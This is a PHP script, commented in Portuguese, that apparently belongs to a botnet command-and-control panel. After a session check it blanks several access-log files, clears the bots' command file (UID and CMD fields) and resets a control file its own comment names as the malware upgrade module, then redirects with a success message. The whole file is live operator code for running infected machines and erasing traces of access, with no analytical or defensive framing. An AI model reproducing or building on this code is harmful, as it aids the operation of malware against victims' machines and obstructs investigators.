<?php
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 
// 9348834858324853.php / DeleteLogs.php ~~
//    Limpa arquivos de logs e arquivos de controle...
//    
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	error_reporting(0);
	session_start();
	
	include("../modules/extras/global.php");	// Dados globais.
	include("../config.php");					// Configurações.
	include("0923840923949455.php");			// Itens globais do site.
	
	// Verifica login...
	if (!isset($_SESSION["LNG"])) { die($errorPage); }
	
	// Limpa arquivos...
	// Limpa arquivos de log...
	$Buf = " "; $File = fopen("../modules/access_log/38459030495663598.txt", "w"); $Grava = fwrite($File, $Buf); fclose($File);
	$Buf = "0"; $File = fopen("../modules/access_log/LNGACS/ALLC.txt", "w"); $Grava = fwrite($File, $Buf); fclose($File);
	$Buf = "0"; $File = fopen("../modules/access_log/LNGACS/ALLN.txt", "w"); $Grava = fwrite($File, $Buf); fclose($File);
	$Buf = "0"; $File = fopen("../modules/access_log/LNGACS/ALLX.txt", "w"); $Grava = fwrite($File, $Buf); fclose($File);
	$Buf = "0"; $File = fopen("../modules/access_log/LNGACS/ALLY.txt", "w"); $Grava = fwrite($File, $Buf); fclose($File);
	
	// Limpa arquivo de controle dos bots...
	$Buf = "[CTLCTR]\nUID=\nCMD=\n"; $File = fopen("../databases/CTLCentral.ini", "w"); $Grava = fwrite($File, $Buf); fclose($File);
	
	// Limpa arquivo de controle do módulo de Upgrade do Malware...
	$Buf = "[CTL]\nID=\n"; $File = fopen("../modules/mupgrade/CTL.ini", "w"); $Grava = fwrite($File, $Buf); fclose($File);
	
	echo '<html><script type="text/javascript">alert("Arquivos de logs e controles limpos com sucesso!");
	window.location.href="3553654543454556.php";</script></html>';
	
// EOF  ~~ 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
?>
